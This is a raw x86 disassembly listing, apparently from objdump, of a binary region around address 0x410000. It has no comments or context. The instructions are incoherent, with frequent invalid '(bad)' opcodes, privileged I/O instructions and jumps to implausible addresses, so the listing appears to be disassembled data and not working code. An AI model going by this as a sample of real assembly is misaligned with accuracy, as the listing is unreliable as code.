  4101dc:	shl    DWORD PTR [ecx+0x1b],0xd1
  4101e0:	push   esp
  4101e1:	sub    ch,cl
  4101e3:	cld    
  4101e4:	add    ch,bl
  4101e6:	inc    eax
  4101e7:	pop    eax
  4101e8:	inc    edx
  4101ea:	mov    bl,0xe7
  4101ec:	adc    esp,DWORD PTR [esi+0x5b]
  4101ef:	add    dh,BYTE PTR [ebx]
  4101f1:	into   
  4101f2:	mov    ds:0x72ea00bc,al
  4101f7:	dec    esi
  4101f8:	inc    edx
  4101f9:	jne    0x4101de
  4101fb:	push   ss
  4101fc:	mov    eax,0x0
  410201:	add    al,al
  410203:	fild   DWORD PTR [ebx]
  410205:	jne    0x410264
  410207:	clc    
  410208:	xor    al,0xd4
  41020a:	dec    ebp
  41020b:	es jp  0x4101e2
  41020e:	sbb    ebp,DWORD PTR ss:[ebp+0x5bcf8d15]
  410215:	push   DWORD PTR [edx-0x5a]
  410218:	inc    ebx
  410219:	jae    0x410293
  41021b:	mov    dl,0x16
  41021d:	mov    esp,0xc603dd48
  410222:	jo     0x4101f5
  410224:	dec    esi
  410225:	inc    edx
  410226:	jne    0x410242
  410228:	retf   
  410229:	(bad)  
  41022a:	pusha  
  41022b:	and    DWORD PTR [edi],ecx
  41022d:	inc    eax
  41022e:	jne    0x410237
  410230:	arpl   WORD PTR [ecx+0x21],ax
  410233:	fld    QWORD PTR [ebx]
  410235:	data16 cld 
  410237:	out    0x1,eax
  410239:	call   0x48404cc
  41023e:	jne    0x4102ba
  410240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410241:	jmp    DWORD PTR [edx+0xd]
  410244:	xchg   ecx,eax
  410245:	dec    edi
  410246:	mov    bh,0x2
  410248:	aam    0xeb
  41024a:	mov    ds:0x61fc1b2f,eax
  41024f:	push   0x13
  410251:	sar    edx,0xb6
  410254:	fisubr WORD PTR [ebx]
  410256:	dec    ecx
  410257:	dec    edx
  410258:	call   0x9c83f360
  41025d:	push   es
  41025e:	in     al,dx
  41025f:	or     eax,0x2374f5d
  410264:	das    
  410265:	inc    DWORD PTR [eax]
  410267:	add    BYTE PTR [eax],al
  410269:	add    BYTE PTR [eax],al
  41026b:	or     dl,BYTE PTR [esi-0x57]
  41026e:	add    esi,DWORD PTR [edi+edx*8+0x5]
  410272:	minps  xmm2,XMMWORD PTR [ebx]
  410275:	test   eax,0xae615303
  41027a:	dec    edi
  41027b:	aaa    
  41027c:	add    al,BYTE PTR [edi-0x2efacf76]
  410282:	push   ss
  410283:	mov    edi,0x308ae902
  410288:	pop    es
  410289:	(bad)  
  41028a:	push   cs
  41028b:	push   ecx
  41028c:	adc    al,0x29
  41028e:	add    al,0x2a
  410290:	int    0x4e
  410292:	mov    edi,DWORD PTR [eax]
  410294:	sti    
  410295:	and    DWORD PTR [ecx+0x21],eax
  410298:	jnp    0x41025e
  41029a:	adc    BYTE PTR [esi+0x2a],0x67
  41029e:	daa    
  41029f:	push   es
  4102a0:	add    al,0xe9
  4102a2:	add    eax,esi
  4102a4:	fdiv   DWORD PTR ds:0xfaea8135
  4102aa:	ret    
  4102ab:	push   edx
  4102ac:	hlt    
  4102ad:	mov    cl,0x8a
  4102af:	mov    dh,0xe6
  4102b1:	mov    esp,0xe5b537f8
  4102b6:	lock cli 
  4102b8:	sbb    bh,bh
  4102ba:	mov    cl,0x74
  4102bc:	add    al,BYTE PTR [eax]
  4102be:	add    edi,ecx
  4102c0:	add    al,BYTE PTR [eax]
  4102c2:	jmp    0x15400993
  4102c7:	popa   
  4102c8:	cmp    DWORD PTR [edx-0x17],eax
  4102cb:	push   ecx
  4102cc:	ret    
  4102cd:	and    ecx,DWORD PTR [ecx]
  4102cf:	add    BYTE PTR [eax],al
  4102d1:	add    BYTE PTR [eax],al
  4102d3:	add    BYTE PTR [edi+0x2],dh
  4102d6:	add    cl,ch
  4102d8:	dec    ecx
  4102d9:	push   ss
  4102da:	aam    0xdb
  4102dc:	ss das 
  4102de:	mov    DWORD PTR [ecx],esi
  4102e0:	in     eax,dx
  4102e1:	sub    esi,DWORD PTR [ebx+0x11]
  4102e4:	repz and BYTE PTR [ebx],0x79
  4102e8:	jbe    0x4102ec
  4102ea:	add    BYTE PTR [ecx-0x32982c3b],bh
  4102f0:	push   ss
  4102f1:	das    
  4102f2:	(bad)  
  4102f3:	mov    edx,0x70010888
  4102f8:	stos   BYTE PTR es:[edi],al
  4102f9:	loop   0x410326
  4102fb:	(bad)  
  4102fc:	push   0x76a912ca
  410301:	test   DWORD PTR [edi-0x7c827b8c],edi
  410307:	or     eax,0xe9fe2f09
  41030c:	(bad)  
  41030d:	das    
  41030e:	adc    al,0x81
  410310:	push   0xffffffc2
  410312:	call   FWORD PTR [edi-0x43]
  410315:	loop   0x41032e
  410317:	push   ecx
  410318:	pop    ebp
  410319:	mov    dh,0x3f
  41031b:	jmp    0xb64c615
  410320:	dec    ecx
  410321:	sub    eax,0xc2836914
  410326:	push   DWORD PTR [ebx+0x1d]
  410329:	loop   0x410372
  41032b:	popa   
  41032c:	add    eax,0x6ee9fe2e
  410331:	xor    cl,BYTE PTR [ecx-0x3a868918]
  410337:	add    BYTE PTR [eax],al
  410339:	add    BYTE PTR [eax],al
  41033b:	add    BYTE PTR [eax],al
  41033d:	adc    bh,BYTE PTR [ebx]
  41033f:	and    ah,BYTE PTR [ecx*2+0x342442b9]
  410346:	and    eax,0xaf1cfffe
  41034b:	inc    edx
  41034c:	and    al,0x88
  41034e:	scas   eax,DWORD PTR es:[edi]
  41034f:	pop    edx
  410350:	and    al,0x7c
  410352:	scas   al,BYTE PTR es:[edi]
  410353:	pop    edx
  410354:	and    al,0x1b
  410356:	scas   eax,DWORD PTR es:[edi]
  410357:	pop    edx
  410358:	and    al,0xc
  41035a:	lods   eax,DWORD PTR ds:[esi]
  41035b:	dec    edx
  41035c:	and    al,0x1c
  41035e:	xor    eax,0xe65f40be
  410363:	add    DWORD PTR [eax+eax*4+0x2a],0xd
  410368:	test   BYTE PTR [ebp+0x67000006],dh
  41036e:	cmp    ah,BYTE PTR [edx]
  410370:	adc    al,0x7a
  410372:	cmp    edi,edi
  410374:	and    BYTE PTR [eax],0x26
  410377:	adc    dl,BYTE PTR [edx]
  410379:	sub    DWORD PTR [edx],ebp
  41037b:	add    eax,0xd26108a
  410380:	mov    dl,dl
  410382:	add    BYTE PTR [esi-0x417afd40],dh
  410388:	inc    ecx
  410389:	repnz scas al,BYTE PTR es:[edi]
  41038b:	inc    edx
  41038c:	and    al,0x78
  41038e:	add    DWORD PTR [edx+0x24],0xffffff98
  410392:	push   ecx
  410393:	les    eax,FWORD PTR [eax+eax*4+0x17]
  410397:	add    bh,bh
  410399:	add    DWORD PTR [ecx+0x10],0x46698c40
  4103a0:	sldt   WORD PTR [eax]
  4103a3:	add    BYTE PTR [eax],al
  4103a5:	add    BYTE PTR [eax],dl
  4103a7:	(bad)  
  4103a8:	(bad)  
  4103a9:	call   FWORD PTR [ecx+ebp*2+0xd]
  4103ad:	test   ch,ch
  4103af:	add    DWORD PTR [eax],eax
  4103b1:	add    BYTE PTR [ecx+eax*1+0x14ca384],ah
  4103b8:	add    BYTE PTR [eax+0x75],cl
  4103bb:	and    al,0x86
  4103bd:	xchg   esp,eax
  4103be:	jne    0x4103db
  4103c0:	add    cl,BYTE PTR [eax+0x72]
  4103c3:	sahf   
  4103c4:	pop    ebp
  4103c5:	(bad)  
  4103c6:	cmp    bl,BYTE PTR [ebx]
  4103c8:	dec    eax
  4103c9:	inc    ebx
  4103ca:	pop    ecx
  4103cb:	es pop es
  4103cd:	mov    al,0x74
  4103cf:	gs (bad) 
  4103d1:	and    esi,DWORD PTR [ebx+0x1b]
  4103d4:	xchg   BYTE PTR [edi-0xd75896],bh
  4103da:	adc    bl,BYTE PTR [ebx]
  4103dc:	call   0xf98d:0x21b7404
  4103e3:	(bad)  
  4103e4:	xchg   edi,eax
  4103e5:	(bad)  
  4103e6:	cli    
  4103e7:	sbb    dl,dl
  4103e9:	push   edx
  4103ea:	inc    esi
  4103eb:	mov    ch,dl
  4103ed:	push   edx
  4103ee:	clc    
  4103ef:	data16 out 0x37,al
  4103f2:	inc    ebp
  4103f3:	in     al,0x17
  4103f5:	sbb    BYTE PTR [edi-0x4a7afda5],al
  4103fb:	and    eax,DWORD PTR [esi+0x21b758a]
  410401:	xor    esi,DWORD PTR [ebp-0x6e7c8484]
  410407:	mov    ds:0x4,eax
  41040c:	add    BYTE PTR [eax],al
  41040e:	add    BYTE PTR [ebp-0x5a],dh
  410411:	xchg   BYTE PTR [ebx],ah
  410413:	add    eax,0x4500021b
  410418:	and    al,0x16
  41041a:	push   esp
  41041b:	sbb    bl,0x3
  41041e:	mov    DWORD PTR [ecx],esi
  410420:	push   ebx
  410422:	xor    DWORD PTR [esi+0x5923c7cd],ebp
  410428:	push   ebx
  410429:	adc    DWORD PTR [edi],eax
  41042b:	jne    0x410448
  41042d:	test   DWORD PTR [edi-0x732bec17],edi
  410433:	icebp  
  410434:	add    eax,0x362ff98
  410439:	jmp    0xcd576011
  41043e:	adc    eax,0x446c02b5
  410443:	rol    ebx,0x64
  410446:	dec    ebp
  410447:	(bad)  
  410448:	in     al,dx
  410449:	push   0xbab6752d
  41044e:	jle    0x410407
  410450:	sub    al,0xb4
  410452:	add    al,0xa2
  410454:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410456:	enter  0xfc56,0xf8
  41045a:	sbb    al,0x4a
  41045c:	inc    esp
  41045d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41045e:	out    0x81,eax
  410460:	push   es
  410461:	inc    edx
  410462:	sbb    dh,BYTE PTR [ebx]
  410464:	mov    DWORD PTR [edi+edi*8],0x49f51777
  41046b:	mov    dh,0xe6
  41046d:	jmp    0x410474
  41046f:	fmul   st(3),st
  410471:	xor    eax,0x31
  410476:	add    BYTE PTR [eax],al
  410478:	jmp    0x4104be
  41047a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41047b:	out    0x71,eax
  41047d:	add    ebx,ebx
  41047f:	inc    ebx
  410480:	int    0xd5
  410482:	sbb    eax,0xac44d331
  410487:	out    0x78,eax
  410489:	repnz add DWORD PTR [edi],eax
  41048c:	mov    ebx,0x9501ccc6
  410491:	sub    al,0x29
  410493:	sbb    eax,0x7f11f009
  410498:	ss out 0xa8,al
  41049b:	shl    ecx,cl
  41049d:	(bad)  
  41049e:	or     al,0xf0
  4104a0:	sub    cl,bh
  4104a2:	imul   eax,edi,0x56
  4104a5:	fidivr DWORD PTR [eax]
  4104a7:	xor    DWORD PTR [ecx-0x1e],esp
  4104aa:	cli    
  4104ab:	ret    
  4104ac:	add    BYTE PTR [esi+0x775eb7a8],0x24
  4104b3:	call   0x2f407e62
  4104b8:	jae    0x410531
  4104ba:	inc    ebx
  4104bb:	add    eax,0xef457a65
  4104c0:	fnstcw WORD PTR [edi-0x3a31d6dd]
  4104c6:	or     DWORD PTR [edx+0x32],esp
  4104c9:	fild   WORD PTR [ebx+0x60]
  4104cc:	sub    al,0xfd
  4104ce:	mov    DWORD PTR ds:0x2509fd4d,ebp
  4104d4:	sbb    eax,0x1d258afe
  4104d9:	sti    
  4104da:	xchg   DWORD PTR [edi],esp
  4104dc:	add    BYTE PTR [eax],al
  4104de:	add    BYTE PTR [eax],al
  4104e0:	add    BYTE PTR [esi-0x17],dh
  4104e3:	dec    ebx
  4104e4:	or     eax,0xed04b569
  4104e9:	test   BYTE PTR [edx-0x40bb17bb],0x23
  4104f0:	fiadd  WORD PTR [ebp-0x41]
  4104f3:	and    ebx,ecx
  4104f5:	mul    BYTE PTR [esi-0x47f11dd]
  4104fb:	cmp    DWORD PTR [eax+0x69fe2ca4],0xe923df12
  410505:	pop    ecx
  410506:	mov    BYTE PTR [edi],0x72
  410509:	adc    bl,bh
  41050b:	adc    esp,DWORD PTR [eax-0x32]
  41050e:	mov    ch,0x8
  410510:	push   cs
  410511:	or     bl,bh
  410513:	sub    edx,DWORD PTR [ecx]
  410515:	outs   dx,DWORD PTR ds:[esi]
  410516:	pop    ecx
  410517:	(bad)  
  410518:	(bad)  
  410519:	cs inc esp
  41051b:	pop    esi
  41051c:	xchg   edi,eax
  41051d:	mov    ecx,0x388ce477
  410522:	(bad)  
  410523:	(bad)  
  410524:	cmp    ebx,DWORD PTR [esi]
  410526:	pop    ss
  410527:	add    ch,0x61
  41052a:	sub    bl,0x15
  41052d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41052e:	aam    0x56
  410530:	inc    ebx
  410531:	sub    edi,0xa75200da
  410537:	aam    0x8d
  410539:	cwde   
  41053a:	sbb    bl,BYTE PTR [edx]
  41053c:	mov    DWORD PTR [eax+0x70891a1a],eax
  410542:	sbb    bl,BYTE PTR [esi]
  410544:	mov    DWORD PTR [eax],eax
  410546:	add    BYTE PTR [eax],al
  410548:	add    BYTE PTR [eax],al
  41054a:	mov    al,0x1a
  41054c:	and    al,bh
  41054e:	cwde   
  41054f:	sbb    ah,BYTE PTR [esi]
  410551:	inc    eax
  410552:	pop    esp
  410553:	push   es
  410554:	add    al,ch
  410556:	inc    ecx
  410557:	mov    ah,0xfd
  410559:	inc    edi
  41055b:	inc    edx
  41055c:	and    bl,BYTE PTR [eax+ebx*4]
  41055f:	mov    esi,0x3a970e72
  410564:	and    ah,BYTE PTR [eax]
  410566:	movsx  eax,WORD PTR [edi+0x391e6874]
  41056d:	ret    
  41056e:	sub    DWORD PTR [ebx],eax
  410570:	push   ecx
  410571:	call   0x3ecbd4
  410576:	pop    edi
  410577:	mov    esi,0x60e15e7
  41057c:	add    BYTE PTR [ebx],dh
  41057e:	pushf  
  41057f:	cmp    DWORD PTR [edx+0x24],0xffffffc9
  410583:	int3   
  410584:	fs stos DWORD PTR es:[edi],eax
  410586:	test   al,0x42
  410589:	and    al,0xd8
  41058b:	(bad)  
  41058c:	out    0xcf,eax
  41058e:	xchg   cl,bl
  410590:	std    
  410591:	mov    ebp,DWORD PTR [edi+eiz*4+0x72]
  410595:	and    al,0xbc
  410597:	sbb    al,0xf1
  410599:	cmovs  edi,ecx
  41059c:	add    BYTE PTR [eax],al
  41059e:	pushf  
  41059f:	lods   al,BYTE PTR ds:[esi]
  4105a0:	sbb    edi,DWORD PTR [edx+ecx*8]
  4105a3:	inc    ebp
  4105a4:	dec    BYTE PTR [edx-0x77eba26]
  4105aa:	je     0x4105d5
  4105ac:	xor    bh,0x0
  4105af:	add    BYTE PTR [eax],al
  4105b1:	add    BYTE PTR [eax],al
  4105b3:	pushf  
  4105b4:	add    eax,0x9c753d00
  4105b9:	add    al,BYTE PTR [eax]
  4105bb:	jne    0x410605
  4105bd:	xchg   bl,ch
  4105bf:	jne    0x4105dc
  4105c1:	add    al,BYTE PTR [ebx+0xf04dff3]
  4105c7:	lock cmp al,0x2
  4105ca:	add    BYTE PTR [ebp+0x43],dh
  4105cd:	stos   DWORD PTR es:[edi],eax
  4105ce:	aad    0x75
  4105d0:	sbb    ebp,esi
  4105d2:	add    eax,edi
  4105d4:	xor    dh,BYTE PTR ds:0x39b8d45
  4105da:	add    BYTE PTR [ebp-0x7c],dh
  4105dd:	clc    
  4105de:	cmp    BYTE PTR [ebx+0x7f750217],0x9c
  4105e5:	lods   al,BYTE PTR ds:[esi]
  4105e6:	inc    edi
  4105e7:	jne    0x410609
  4105e9:	xchg   BYTE PTR [edi+0x33021b75],bh
  4105ef:	xor    eax,0xfc660455
  4105f4:	pop    esi
  4105f5:	out    0x2f,al
  4105f7:	lods   al,BYTE PTR ds:[esi]
  4105f8:	sahf   
  4105f9:	scas   al,BYTE PTR es:[edi]
  4105fa:	and    edx,DWORD PTR [ebx-0x34]
  4105fd:	pop    ecx
  4105fe:	test   eax,0xeb1240ee
  410603:	dec    edx
  410604:	mov    ah,0xc5
  410606:	or     esi,eax
  410608:	fidiv  DWORD PTR [esi+0x1287ee4c]
  41060e:	sbb    esp,0x2a
  410611:	mov    bh,0x1d
  410613:	pop    ebx
  410614:	pushf  
  410615:	jmp    0x0:0x1
  41061c:	inc    eax
  41061d:	xor    edi,DWORD PTR [eax+0x4b]
  410620:	cdq    
  410621:	dec    edx
  410622:	sub    al,0x43
  410624:	xchg   ecx,eax
  410625:	push   0xffffff86
  410627:	enter  0x6c28,0x81
  41062b:	mov    edi,0x50068571
  410630:	lock pop esi
  410632:	out    0x3a,al
  410634:	mov    es,WORD PTR [ecx]
  410636:	or     BYTE PTR [ecx-0x1dabfa73],al
  41063c:	adc    BYTE PTR [ebp+0x6081510],al
  410642:	arpl   ax,ax
  410644:	push   esi
  410645:	hlt    
  410646:	(bad)  
  410647:	enter  0xf496,0x64
  41064b:	cmp    esp,ecx
  41064d:	adc    ch,BYTE PTR [edx+0x44]
  410650:	jp     0x4105ee
  410652:	fcom   st(3)
  410654:	jmp    0xc32dd317
  410659:	daa    
  41065a:	mov    ecx,0x61f73681
  41065f:	lods   eax,DWORD PTR ds:[esi]
  410660:	jp     0x4106df
  410662:	lea    esi,[edi-0x398e5eef]
  410668:	push   0xffffffa0
  41066a:	outs   dx,DWORD PTR ds:[esi]
  41066b:	enter  0xd656,0x61
  41066f:	(bad)  
  410670:	bound  ebp,QWORD PTR [ecx+0x6d]
  410673:	add    al,0x75
  410675:	add    ah,BYTE PTR [edx]
  410677:	cmp    al,0x6c
  410679:	cmp    DWORD PTR [esi+0x53],edx
  41067c:	push   esp
  41067d:	cmp    ah,BYTE PTR [ecx-0x3a]
  410680:	add    BYTE PTR [eax],al
  410682:	add    BYTE PTR [eax],al
  410684:	add    BYTE PTR [esi],bh
  410686:	jp     0x410624
  410688:	out    0x48,eax
  41068a:	imul   eax,DWORD PTR [ebp+0x2d],0x7ac627f2
  410691:	fiadd  WORD PTR ds:0xe3afb5e9
  410698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410699:	in     eax,dx
  41069a:	mov    esi,0xb5cdccc
  41069f:	ins    BYTE PTR es:[edi],dx
  4106a0:	enter  0xf296,0xb8
  4106a4:	sub    al,0x46
  4106a6:	faddp  st(0),st
  4106a8:	jle    0x4106e8
  4106aa:	(bad)  
  4106ac:	sbb    ebx,DWORD PTR [eax-0xed3028e]
  4106b2:	inc    edx
  4106b3:	(bad)  
  4106b4:	jl     0x410730
  4106b6:	sub    BYTE PTR [ebx-0x3b],al
  4106b9:	outs   dx,DWORD PTR ds:[esi]
  4106ba:	jnp    0x410731
  4106bc:	icebp  
  4106bd:	sti    
  4106be:	sub    eax,0x2544640e
  4106c3:	(bad)  
  4106c4:	(bad)  
  4106c5:	push   ecx
  4106c6:	mov    bl,0x23
  4106c8:	stc    
  4106c9:	pop    esi
  4106ca:	stos   DWORD PTR es:[edi],eax
  4106cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106cc:	(bad)  
  4106cd:	mov    eax,ds:0x7653daf4
  4106d2:	sbb    dh,BYTE PTR [edi-0x75d76e5f]
  4106d8:	mov    ecx,0x3073344d
  4106dd:	into   
  4106de:	retf   
  4106df:	and    edi,ecx
  4106e1:	pop    edi
  4106e2:	add    eax,0xc5c3d27e
  4106e7:	add    ebp,DWORD PTR [edx+0x0]
  4106ea:	add    BYTE PTR [eax],al
  4106ec:	add    BYTE PTR [eax],al
  4106ee:	or     eax,0x17fc1003
  4106f3:	jl     0x4106f7
  4106f5:	fs mov dh,0xb3
  4106f8:	sbb    al,BYTE PTR [ebx]
  4106fa:	ins    DWORD PTR es:[edi],dx
  4106fb:	cmp    DWORD PTR [edi+0x732846e5],0xd
  410702:	xor    DWORD PTR [esi+0x7b],esi
  410705:	add    eax,0x99901f29
  41070a:	push   ecx
  41070b:	sub    BYTE PTR [ecx+ebp*1-0x5201fd3e],al
  410712:	fimul  DWORD PTR [eax]
  410714:	jmp    DWORD PTR [ebp-0x5275092e]
  41071a:	(bad)  
  41071c:	sub    BYTE PTR [edx],0xde
  41071f:	jmp    0x410726
  410721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410722:	mov    esp,?
  410724:	fidiv  DWORD PTR [edi+0x16a6e36e]
  41072a:	xchg   ecx,eax
  41072b:	cdq    
  41072c:	add    DWORD PTR [ecx],eax
  41072e:	adc    al,0x3f
  410730:	inc    BYTE PTR [eax]
  410732:	jnp    0x4106de
  410734:	out    dx,al
  410735:	cmp    ebp,DWORD PTR [edi+0x889476f]
  41073b:	pop    ds
  41073c:	push   cs
  41073d:	cmp    DWORD PTR [edx+0x3a8d3954],ebp
  410743:	add    al,BYTE PTR [ebx+0x74fe907b]
  410749:	and    DWORD PTR [edi],edx
  41074b:	inc    DWORD PTR [eax+eax*8+0x1069f720]
  410752:	add    BYTE PTR [eax],al
  410754:	add    BYTE PTR [eax],al
  410756:	add    bh,bl
  410758:	mov    esi,0x732b5006
  41075d:	and    ch,BYTE PTR [eax]
  41075f:	fstp   DWORD PTR [edx+0x22]
  410762:	sub    BYTE PTR [esi+edx*1],dh
  410765:	scas   al,BYTE PTR es:[edi]
  410766:	call   FWORD PTR [ebx]
  410768:	test   BYTE PTR [esi+0x42dc5074],bh
  41076e:	and    al,0x47
  410770:	fld    DWORD PTR [edx+0x24]
  410773:	cmp    al,0xa5
  410775:	inc    edx
  410776:	and    al,0x4c
  410778:	jge    0x41073b
  41077a:	or     BYTE PTR [edi],dh
  41077c:	add    al,0x7c
  41077e:	retf   0xb4df
  410781:	push   esp
  410782:	call   0x3ea881
  410787:	sub    cl,BYTE PTR es:[ebx+0x4ff67044]
  41078e:	push   ebx
  41078f:	cdq    
  410790:	pop    edx
  410791:	and    ch,BYTE PTR [eax]
  410793:	xchg   ebp,eax
  410794:	cmp    ah,BYTE PTR [edx]
  410796:	and    DWORD PTR [ecx+eax*1-0x50],eax
  41079a:	jmp    FWORD PTR [ebx+0x6c2442a5]
  4107a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107a1:	dec    ebx
  4107a2:	or     bh,bh
  4107a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107a5:	jmp    edi
  4107a7:	mov    al,es:0x4247fffd
  4107ad:	and    bl,BYTE PTR [esi*2-0x11a53794]
  4107b4:	dec    al
  4107b6:	sar    DWORD PTR [ecx+0x1b],0xcf
  4107ba:	mov    al,BYTE PTR [eax]
  4107bc:	add    BYTE PTR [eax],al
  4107be:	add    BYTE PTR [eax],al
  4107c0:	cdq    
  4107c1:	cwde   
  4107c2:	pop    ss
  4107c3:	outs   dx,DWORD PTR ds:[esi]
  4107c4:	inc    esi
  4107c5:	test   DWORD PTR [edi+ecx*1-0x12ee4f1],ebx
  4107cc:	push   0x754011db
  4107d1:	cwde   
  4107d2:	ds or  esi,eax
  4107d5:	(bad)  
  4107d6:	pop    ebx
  4107d7:	dec    edi
  4107d8:	mov    bl,0x1c
  4107da:	add    eax,edi
  4107dc:	mov    eax,0x6affc293
  4107e1:	sbb    ebp,DWORD PTR [ecx]
  4107e3:	adc    al,0x8d
  4107e5:	dec    ecx
  4107e6:	ret    0xf1ff
  4107e9:	pop    edx
  4107ea:	scas   al,BYTE PTR es:[edi]
  4107eb:	and    bh,dh
  4107ed:	aad    0x6f
  4107ef:	mov    bh,BYTE PTR [eax+0x34abf9cb]
  4107f5:	daa    
  4107f6:	inc    ebx
  4107f7:	out    0x61,eax
  4107f9:	sahf   
  4107fa:	inc    edx
  4107fb:	je     0x410875
  4107fd:	cwde   
  4107fe:	sub    edi,esi
  410800:	mov    ds:0x54c8f51c,eax
  410805:	fisubr WORD PTR [edi]
  410807:	jmp    0x6bfc:0xf3bfa276
  41080e:	add    ecx,DWORD PTR [ebp-0x12d0c50]
  410814:	push   0x75401457
  410819:	xchg   ebx,eax
  41081a:	sub    esi,edi
  41081c:	jne    0x410839
  41081e:	in     eax,dx
  41081f:	inc    esp
  410820:	leave  
  410821:	xchg   ebp,eax
  410822:	scas   eax,DWORD PTR es:[edi]
  410823:	pop    DWORD PTR [eax]
  410825:	add    BYTE PTR [eax],al
  410827:	add    BYTE PTR [eax],al
  410829:	jle    0x410806
  41082b:	xor    edi,ecx
  41082d:	xchg   esi,eax
  41082e:	pop    esi
  41082f:	inc    esi
  410830:	gs cld 
  410832:	add    DWORD PTR [esi-0x1778f300],ebp
  410838:	add    esi,DWORD PTR [ebp+0x1a]
  41083b:	fld    DWORD PTR [ecx-0x4fa3fd8b]
  410841:	mov    ds:0x75036669,al
  410846:	add    dl,BYTE PTR [ecx]
  410848:	loope  0x410842
  41084a:	add    ch,cl
  41084c:	jle    0x4107fe
  41084e:	rcr    DWORD PTR [ebx-0x40],1
  410851:	add    dl,dl
  410853:	mov    al,ds:0x69027506
  410858:	sbb    al,0x8b
  41085a:	ja     0x410844
  41085c:	add    ebp,esi
  41085e:	out    dx,al
  41085f:	sbb    al,0xf
  410861:	mov    ch,0x2
  410863:	push   ebx
  410864:	aam    0xfd
  410866:	mov    ebx,0x994828e5
  41086b:	es jl  0x410821
  41086e:	imul   DWORD PTR [ebp+0x71b3dc52]
  410874:	dec    esp
  410875:	dec    ebx
  410876:	dec    ebp
  410877:	imul   edx,ebp,0x43
  41087a:	push   0xffffff93
  41087c:	sub    DWORD PTR [edx],edi
  41087e:	and    al,0xd1
  410880:	push   edx
  410881:	stos   DWORD PTR es:[edi],eax
  410882:	repz jae 0x410859
  410885:	sub    ebp,eax
  410887:	xchg   edi,eax
  410888:	mov    cl,0x7a
  41088a:	pushf  
  41088b:	pop    edi
  41088c:	leave  
  41088d:	add    BYTE PTR [eax],al
  41088f:	add    BYTE PTR [eax],al
  410891:	add    BYTE PTR [esi-0x64],ch
  410894:	pop    edi
  410895:	rol    DWORD PTR [eax+0x373ac1c4],0xce
  41089c:	jno    0x4108b6
  41089e:	neg    DWORD PTR [esi]
  4108a0:	push   eax
  4108a1:	or     DWORD PTR [esi],0xffffffef
  4108a4:	out    0x3,eax
  4108a6:	jne    0x410877
  4108a8:	sahf   
  4108a9:	shl    BYTE PTR [edi-0x12b306be],1
  4108af:	(bad)  
  4108b0:	dec    DWORD PTR [ecx+ebx*1]
  4108b3:	ja     0x410930
  4108b5:	add    eax,0xdaaa590d
  4108ba:	ss jp  0x410918
  4108bd:	lds    esi,FWORD PTR [edx-0x5132848a]
  4108c3:	pop    eax
  4108c4:	stos   BYTE PTR es:[edi],al
  4108c5:	pusha  
  4108c6:	mov    ebp,0x36ba5fdf
  4108cb:	jbe    0x410948
  4108cd:	lds    eax,FWORD PTR [edx]
  4108cf:	pop    ecx
  4108d0:	mov    WORD PTR [ebp-0x46],?
  4108d3:	jmp    0x41085d
  4108d5:	lea    esi,[edx+0x38d1aad3]
  4108db:	pop    ds
  4108dc:	(bad)  
  4108dd:	call   0x6d6477ed
  4108e2:	jbe    0x4108e6
  4108e4:	add    BYTE PTR [ecx-0x1601dd03],dl
  4108ea:	mov    ch,0xbf
  4108ec:	and    eax,DWORD PTR [ecx]
  4108ee:	cmp    eax,0xdfe93fae
  4108f3:	(bad)  
  4108f4:	and    ebp,DWORD PTR [ecx]
  4108f6:	add    BYTE PTR [eax],al
  4108f8:	add    BYTE PTR [eax],al
  4108fa:	add    dh,cl
  4108fc:	(bad)  
  4108fd:	and    ebp,DWORD PTR ds:0xe884aa69
  410903:	jbe    0x41097a
  410905:	mov    bl,0xcd
  410907:	mov    ds:0x9ee9fe23,al
  41090c:	cmp    edi,0xffffffe8
  41090f:	jbe    0x41092b
  410911:	addr16 fs ja 0x410917
  410915:	mov    ebp,DWORD PTR [edi-0x3abc89ba]
  41091b:	sbb    dh,BYTE PTR [ebx+0x232b4de7]
  410921:	(bad)  
  410922:	gs mov dh,0xae
  410925:	sbb    DWORD PTR [edx+edi*2-0x21],esp
  410929:	sub    ecx,0x76
  41092c:	add    dl,BYTE PTR [eax+0x0]
  41092f:	popa   
  410930:	arpl   WORD PTR [edx],sp
  410932:	cmp    al,0xfc
  410934:	push   es
  410935:	int    0x25
  410937:	int3   
  410938:	inc    BYTE PTR [ebx+0x3ea2b3c0]
  41093e:	add    esp,ebx
  410940:	dec    BYTE PTR [edx+0x400e183d]
  410946:	add    BYTE PTR [ecx+0x63],dl
  410949:	and    cl,BYTE PTR [eax+0x15]
  41094c:	arpl   WORD PTR [edx],sp
  41094e:	and    BYTE PTR [ecx],ah
  410950:	arpl   WORD PTR [edx],sp
  410952:	push   esp
  410953:	and    eax,0x11242263
  410958:	arpl   WORD PTR [edx],sp
  41095a:	pusha  
  41095b:	adc    eax,0x282263
  410960:	add    BYTE PTR [eax],al
  410962:	add    BYTE PTR [eax],al
  410964:	add    DWORD PTR [edx+0x22],eax
  410967:	and    BYTE PTR ds:0xcb142242,al
  41096d:	inc    ecx
  41096e:	and    bl,BYTE PTR [eax+eiz*2]
  410971:	jb     0x4109b1
  410973:	add    BYTE PTR [ebx],bl
  410975:	inc    ebx
  410976:	and    ch,BYTE PTR [edi+ecx*2]
  410979:	push   es
  41097a:	add    BYTE PTR [eax],al
  41097c:	xlat   BYTE PTR ds:[ebx]
  41097d:	inc    edx
  41097e:	and    bl,BYTE PTR [edx+edi*4]
  410981:	popf   
  410982:	dec    BYTE PTR [eax+ebp*4+0x4c00d622]
  410989:	push   es
  41098a:	call   0x48d283
  41098f:	cmp    DWORD PTR [eax+0x22],esp
  410992:	inc    edx
  410993:	jne    0x4109e4
  410995:	jle    0x4109b9
  410997:	jne    0x4109e5
  410999:	push   es
  41099a:	call   edi
  41099c:	xchg   ebp,eax
  41099d:	inc    edx
  41099e:	and    al,BYTE PTR [edi+eax*8-0x3c]
  4109a2:	or     eax,0x64684
  4109a7:	add    BYTE PTR [ecx+0x75d82282],dl
  4109ad:	sub    eax,DWORD PTR [edx]
